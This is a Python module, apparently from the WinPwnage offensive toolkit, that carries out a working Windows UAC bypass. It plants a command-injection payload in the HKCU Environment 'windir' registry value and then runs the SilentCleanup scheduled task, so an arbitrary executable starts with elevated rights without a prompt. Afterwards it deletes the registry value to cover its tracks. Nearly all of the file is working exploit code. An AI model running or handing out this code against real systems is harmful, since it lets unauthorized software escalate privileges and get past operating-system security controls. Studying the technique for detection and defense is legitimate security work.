import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

silentcleanup_info = {
	"Description": "Bypass UAC using silentcleanup and registry key manipulation",
	"Id": "4",
	"Type": "UAC bypass",
	"Fixed In": "999999",
	"Works From": "9600",
	"Admin": False,
	"Function Name": "silentcleanup",
	"Function Payload": True,
}


def silentcleanup(payload):
	if payloads().exe(payload):
		path = "Environment"

		if registry().modify_key(hkey="hkcu", path=path, name="windir", value="cmd.exe /k {payload} & ".format(payload=os.path.join(payload)), create=True):
			print_success("Successfully created WINDIR key containing payload ({payload})".format(payload=os.path.join(payload)))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("schtasks.exe", params="/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"):
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				return False

		time.sleep(5)
		
		if registry().remove_key(hkey="hkcu", path=path, name="windir", delete_key=False):
			print_success("Successfully cleaned up, enjoy!")
		else:
			print_error("Unable to cleanup")
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False